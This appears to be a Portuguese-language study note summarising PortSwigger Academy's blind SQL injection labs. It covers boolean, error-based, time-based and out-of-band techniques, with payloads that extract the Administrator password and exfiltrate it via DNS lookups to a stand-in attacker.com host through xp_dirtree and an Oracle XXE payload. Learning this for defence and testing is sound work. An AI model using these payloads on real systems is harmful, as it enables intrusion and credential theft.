# 🧠 Blind SQL Injection — (PortSwigger Academy)

Este documento resume tudo o que foi aprendido sobre **Blind SQL Injection**, incluindo técnicas de exploração, exfiltração de dados e evolução de ataques.

---

# 📌 1. O que é Blind SQL Injection

Blind SQL Injection ocorre quando:

- A aplicação é vulnerável a SQL Injection
- Mas não retorna dados diretamente
- E não exibe erros SQL úteis

👉 Isso impede técnicas como `UNION SELECT` tradicionais.

---

# 🧩 2. Conditional-Based Blind SQLi

A técnica mais básica consiste em explorar diferenças de comportamento da aplicação.

### Exemplo:

```sql
TrackingId=abc' AND '1'='1

✔ Resultado: resposta normal (ex: "Welcome back")

TrackingId=abc' AND '1'='2

❌ Resultado: comportamento diferente

🔥 Extração de dados (caractere por caractere)
TrackingId=abc' AND SUBSTRING((SELECT password FROM users WHERE username='Administrator'),1,1)='s

👉 Permite brute force de senhas.

⚠️ 3. Error-Based Blind SQLi

Explora mensagens de erro para inferir dados.

Exemplo com CASE:
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
Erro → condição verdadeira
Sem erro → condição falsa
💣 Exfiltração via erro (CAST)
CAST((SELECT password FROM users) AS int)

👉 Força erro contendo dados sensíveis.

⏱️ 4. Time-Based Blind SQLi

Usado quando não há diferença visível nem erro.

SQL Server example:
IF (1=1) WAITFOR DELAY '0:0:10'
🔥 Extração baseada em tempo:
IF (SUBSTRING(password,1,1)='s')
WAITFOR DELAY '0:0:10'

👉 Delay indica condição verdadeira.

🌐 5. Out-of-Band (OAST) SQL Injection

Quando não há resposta visível nem delay útil.

👉 Usa requisições externas (DNS/HTTP)

🔥 DNS interaction (SQL Server)
'; exec master..xp_dirtree '//attacker.com/a'--

👉 Força DNS lookup

💣 6. OAST Data Exfiltration

Permite extrair dados diretamente via DNS.

Exemplo:
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
👀 Resultado:
S3curePassword.attacker.com

👉 Senha vazada no subdomínio.

🧪 7. Oracle + XXE + SQLi (avançado)

Combinação de:

SQL Injection
XML parsing (EXTRACTVALUE)
XXE injection
OAST DNS exfiltration
Exemplo:
x' UNION SELECT EXTRACTVALUE(
xmltype('
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.attacker.com/">
%remote;
]>
'),
'/l'
) FROM dual--
🧠 8. Evolução das técnicas
🔹 Nível 1 — Visível
UNION SELECT
🔹 Nível 2 — Blind Boolean
AND '1'='1
🔹 Nível 3 — Error-Based
CASE WHEN / CAST
🔹 Nível 4 — Time-Based
WAITFOR DELAY
🔹 Nível 5 — OAST (DNS/HTTP)

xp_dirtree
EXTRACTVALUE + XXE

🚨 9. Mentalidade correta

Não é sobre payloads.

É sobre canais de inferência:

📄 Resposta da aplicação
❌ Erros SQL
⏱️ Tempo de resposta
🌐 Interações externas (DNS/HTTP)
🧩 10. Conclusão

Blind SQL Injection é uma evolução lógica:

Quando não há visibilidade direta, você cria canais alternativos para observar o banco.

OAST é a forma mais poderosa porque:

Funciona mesmo sem resposta
Permite exfiltração direta
É difícil de bloquear completamente
